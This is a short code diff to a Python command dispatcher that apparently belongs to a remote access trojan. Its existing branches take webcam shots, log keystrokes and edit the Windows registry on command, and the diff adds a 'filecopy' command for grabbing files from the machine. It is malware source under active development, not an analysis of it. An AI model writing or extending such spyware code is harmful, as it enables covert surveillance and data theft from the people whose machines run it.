@@ -139,10 +139,16 @@ def execute_one_command(cmd):
         now = datetime.now().strftime("%H:%M:%S, %Y/%m/%d")
         return [cmd, f"Webcamshot at {now}", filepath]
 
+    # filecopy 12345 file_path
+    elif cmd.startswith('filecopy'):
+        filepath = cmd.split(' ')[-1]
+        return [cmd, f"File copy at {filepath}", filepath]
+
     # cmd = 'keylog 12345'
     elif cmd.startswith('keylog'):
         keys_pressed = kl.keylog()
         return [cmd, keys_pressed]
+
     # cmd = 'regedit 12345 HKEY_CURRENT_USER|Software\\SampleKey<>binvalue<>12'
     elif cmd.startswith('regedit'):
         id, basekey, subkey, name, value = reg.parse_regedit_cmd(cmd)
